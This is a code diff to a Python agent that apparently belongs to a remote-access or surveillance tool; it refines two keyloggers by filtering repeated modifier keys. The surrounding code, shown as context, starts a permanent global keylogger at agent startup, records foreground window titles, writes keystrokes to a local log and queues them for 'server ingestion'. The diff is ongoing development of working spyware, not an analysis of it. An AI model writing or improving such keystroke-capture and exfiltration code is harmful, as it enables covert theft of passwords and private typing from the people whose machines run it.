@@ -373,6 +373,14 @@ def get_foreground_window_title() -> str:
         return ""
 
 
+def is_modifier_key(key_text: str) -> bool:
+    """Check if key_text represents a modifier key (SHIFT, CTRL, ALT, CMD, WIN, CAPS_LOCK)."""
+    if not (key_text.startswith("[") and key_text.endswith("]")):
+        return False
+    inner = key_text[1:-1].upper()
+    return any(mod in inner for mod in ["SHIFT", "CTRL", "ALT", "CMD", "WIN", "CAPS_LOCK"])
+
+
 def start_permanent_keylogger():
     """Start permanent, continuous global keylogger on agent startup."""
     if platform.system() != "Windows":
@@ -386,7 +394,10 @@ def start_permanent_keylogger():
     if "permanent" in ACTIVE_LISTENERS:
         return
 
+    last_modifier_key = None
+
     def on_press(key):
+        nonlocal last_modifier_key
         try:
             win_title = get_foreground_window_title()
             key_text = ""
@@ -396,6 +407,14 @@ def start_permanent_keylogger():
             else:
                 key_str = str(key).replace('Key.', '').upper()
                 key_text = f"[{key_str}]"
+
+            # Filter consecutive duplicate modifier keys (e.g. repeated SHIFT/CTRL/ALT)
+            if is_modifier_key(key_text):
+                if last_modifier_key == key_text:
+                    return
+                last_modifier_key = key_text
+            else:
+                last_modifier_key = None
 
             # Push to live stream queue for server ingestion
             LIVE_STREAM_QUEUE.put({
@@ -476,7 +495,10 @@ async def action_keylog(task: PersistentTask, iteration: int) -> Optional[str]:
     if task.task_id not in ACTIVE_LISTENERS:
         print(f"[KEYLOG] Starting listener for task {task.task_id}")
         
+        last_modifier_key = None
+
         def on_press(key):
+            nonlocal last_modifier_key
             try:
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                 win_title = get_foreground_window_title()
@@ -488,6 +510,14 @@ async def action_keylog(task: PersistentTask, iteration: int) -> Optional[str]:
                     key_str = str(key).replace('Key.', '').upper()
                     key_text = f"[{key_str}]"
                 
+                # Filter consecutive duplicate modifier keys (e.g. repeated SHIFT/CTRL/ALT)
+                if is_modifier_key(key_text):
+                    if last_modifier_key == key_text:
+                        return
+                    last_modifier_key = key_text
+                else:
+                    last_modifier_key = None
+
                 # 1. Local persistent file log
                 with open(log_path, 'a', encoding='utf-8') as f:
                     f.write(f"[{timestamp}] {key_text}\n")
